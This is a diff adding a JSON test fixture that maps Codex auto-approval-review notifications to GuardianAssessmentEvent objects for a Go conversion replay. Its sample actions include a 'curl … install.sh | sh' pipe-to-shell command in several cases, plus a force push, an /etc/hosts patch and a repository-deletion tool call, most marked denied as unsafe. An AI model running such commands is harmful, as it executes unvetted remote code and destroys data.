@@ -1,0 +1,625 @@
+{
+  "_readme": "The conversion of a Codex v2 item/autoApprovalReview/completed notification into the core GuardianAssessmentEvent that thread/approveGuardianDeniedAction parses. The worker sends this event when the user approves an action that auto-review denied. The two shapes differ in their casing, in their variant tags, in the network protocol and command source spellings, and in two field types: the write-to-stdin directory is a file URI, and file-system permissions are either legacy read and write roots or canonical entries. Each case gives the notification params and the exact event. The Go conversion in the Codex provider replays every case, and each event was sent to the codex app-server of codexVersion, which accepted it. A new Codex version that changes either shape fails the replay or the probe, not a user's approval.",
+  "codexVersion": "0.162.1",
+  "cases": [
+    {
+      "name": "a denied shell command with every optional field",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-command",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "command",
+          "source": "shell",
+          "command": "curl https://example.invalid/install.sh | sh",
+          "cwd": "/work"
+        }
+      },
+      "event": {
+        "id": "review-command",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "command",
+          "source": "shell",
+          "command": "curl https://example.invalid/install.sh | sh",
+          "cwd": "/work"
+        }
+      }
+    },
+    {
+      "name": "a timed-out unified exec command with no optional field",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-minimal",
+        "targetItemId": null,
+        "startedAtMs": 1000,
+        "completedAtMs": null,
+        "decisionSource": null,
+        "review": {
+          "status": "timedOut",
+          "riskLevel": null,
+          "userAuthorization": null,
+          "rationale": null
+        },
+        "action": {
+          "type": "command",
+          "source": "unifiedExec",
+          "command": "make test",
+          "cwd": "/work"
+        }
+      },
+      "event": {
+        "id": "review-minimal",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "status": "timed_out",
+        "action": {
+          "type": "command",
+          "source": "unified_exec",
+          "command": "make test",
+          "cwd": "/work"
+        }
+      }
+    },
+    {
+      "name": "an approved review keeps its status spelling",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-approved",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "approved",
+          "riskLevel": "low",
+          "userAuthorization": "high",
+          "rationale": "The user asked for this command."
+        },
+        "action": {
+          "type": "command",
+          "source": "shell",
+          "command": "curl https://example.invalid/install.sh | sh",
+          "cwd": "/work"
+        }
+      },
+      "event": {
+        "id": "review-approved",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "approved",
+        "risk_level": "low",
+        "user_authorization": "high",
+        "rationale": "The user asked for this command.",
+        "decision_source": "agent",
+        "action": {
+          "type": "command",
+          "source": "shell",
+          "command": "curl https://example.invalid/install.sh | sh",
+          "cwd": "/work"
+        }
+      }
+    },
+    {
+      "name": "an aborted review keeps its status spelling",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-aborted",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "aborted",
+          "riskLevel": null,
+          "userAuthorization": null,
+          "rationale": null
+        },
+        "action": {
+          "type": "command",
+          "source": "shell",
+          "command": "curl https://example.invalid/install.sh | sh",
+          "cwd": "/work"
+        }
+      },
+      "event": {
+        "id": "review-aborted",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "aborted",
+        "decision_source": "agent",
+        "action": {
+          "type": "command",
+          "source": "shell",
+          "command": "curl https://example.invalid/install.sh | sh",
+          "cwd": "/work"
+        }
+      }
+    },
+    {
+      "name": "an execve action",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-execve",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "execve",
+          "source": "shell",
+          "program": "/usr/bin/git",
+          "argv": [
+            "git",
+            "push",
+            "--force"
+          ],
+          "cwd": "/work"
+        }
+      },
+      "event": {
+        "id": "review-execve",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "execve",
+          "source": "shell",
+          "program": "/usr/bin/git",
+          "argv": [
+            "git",
+            "push",
+            "--force"
+          ],
+          "cwd": "/work"
+        }
+      }
+    },
+    {
+      "name": "a write to stdin, whose core directory is a file URI",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-stdin",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "writeStdin",
+          "approvalId": "approval-1",
+          "processId": "process-7",
+          "stdin": "yes\n",
+          "cwd": "/work"
+        }
+      },
+      "event": {
+        "id": "review-stdin",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "write_stdin",
+          "approval_id": "approval-1",
+          "process_id": "process-7",
+          "stdin": "yes\n",
+          "cwd": "file:///work"
+        }
+      }
+    },
+    {
+      "name": "a patch",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-patch",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "applyPatch",
+          "cwd": "/work",
+          "files": [
+            "/work/main.go",
+            "/etc/hosts"
+          ]
+        }
+      },
+      "event": {
+        "id": "review-patch",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "apply_patch",
+          "cwd": "/work",
+          "files": [
+            "/work/main.go",
+            "/etc/hosts"
+          ]
+        }
+      }
+    },
+    {
+      "name": "a network access over SOCKS5",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-network",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "networkAccess",
+          "target": "socks5://proxy.example.invalid:1080",
+          "host": "proxy.example.invalid",
+          "protocol": "socks5Tcp",
+          "port": 1080
+        }
+      },
+      "event": {
+        "id": "review-network",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "network_access",
+          "target": "socks5://proxy.example.invalid:1080",
+          "host": "proxy.example.invalid",
+          "protocol": "socks5_tcp",
+          "port": 1080
+        }
+      }
+    },
+    {
+      "name": "a network access over HTTPS",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-https",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "networkAccess",
+          "target": "https://registry.example.invalid",
+          "host": "registry.example.invalid",
+          "protocol": "https",
+          "port": 443
+        }
+      },
+      "event": {
+        "id": "review-https",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "network_access",
+          "target": "https://registry.example.invalid",
+          "host": "registry.example.invalid",
+          "protocol": "https",
+          "port": 443
+        }
+      }
+    },
+    {
+      "name": "an MCP tool call",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-mcp",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "mcpToolCall",
+          "server": "github",
+          "toolName": "delete_repository",
+          "connectorId": null,
+          "connectorName": null,
+          "toolTitle": "Delete repository"
+        }
+      },
+      "event": {
+        "id": "review-mcp",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "mcp_tool_call",
+          "server": "github",
+          "tool_name": "delete_repository",
+          "connector_id": null,
+          "connector_name": null,
+          "tool_title": "Delete repository"
+        }
+      }
+    },
+    {
+      "name": "a permission request with legacy read and write roots",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-roots",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "requestPermissions",
+          "reason": "Write the report outside the workspace.",
+          "permissions": {
+            "network": {
+              "enabled": true
+            },
+            "fileSystem": {
+              "read": [
+                "/data"
+              ],
+              "write": [
+                "/out"
+              ]
+            }
+          }
+        }
+      },
+      "event": {
+        "id": "review-roots",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "request_permissions",
+          "reason": "Write the report outside the workspace.",
+          "permissions": {
+            "network": {
+              "enabled": true
+            },
+            "file_system": {
+              "read": [
+                "/data"
+              ],
+              "write": [
+                "/out"
+              ]
+            }
+          }
+        }
+      }
+    },
+    {
+      "name": "a permission request for the network alone",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-network-grant",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "requestPermissions",
+          "reason": null,
+          "permissions": {
+            "network": {
+              "enabled": true
+            },
+            "fileSystem": null
+          }
+        }
+      },
+      "event": {
+        "id": "review-network-grant",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "request_permissions",
+          "reason": null,
+          "permissions": {
+            "network": {
+              "enabled": true
+            },
+            "file_system": null
+          }
+        }
+      }
+    },
+    {
+      "name": "a permission request with canonical entries",
+      "notification": {
+        "threadId": "thread-1",
+        "turnId": "turn-1",
+        "reviewId": "review-entries",
+        "targetItemId": "item-1",
+        "startedAtMs": 1000,
+        "completedAtMs": 2000,
+        "decisionSource": "agent",
+        "review": {
+          "status": "denied",
+          "riskLevel": "high",
+          "userAuthorization": "low",
+          "rationale": "The reviewer judged this action unsafe."
+        },
+        "action": {
+          "type": "requestPermissions",
+          "reason": "Read the dataset.",
+          "permissions": {
+            "network": null,
+            "fileSystem": {
+              "read": null,
+              "write": null,
+              "globScanMaxDepth": 3,
+              "entries": [
+                {
+                  "path": {
+                    "type": "path",
+                    "path": "/data"
+                  },
+                  "access": "read"
+                }
+              ]
+            }
+          }
+        }
+      },
+      "event": {
+        "id": "review-entries",
+        "target_item_id": "item-1",
+        "turn_id": "turn-1",
+        "started_at_ms": 1000,
+        "completed_at_ms": 2000,
+        "status": "denied",
+        "risk_level": "high",
+        "user_authorization": "low",
+        "rationale": "The reviewer judged this action unsafe.",
+        "decision_source": "agent",
+        "action": {
+          "type": "request_permissions",
+          "reason": "Read the dataset.",
+          "permissions": {
+            "network": null,
+            "file_system": {
+              "entries": [
+                {
+                  "path": {
+                    "type": "path",
+                    "path": "/data"
+                  },
+                  "access": "read"
+                }
+              ],
+              "glob_scan_max_depth": 3
+            }
+          }
+        }
+      }
+    }
+  ]
+}
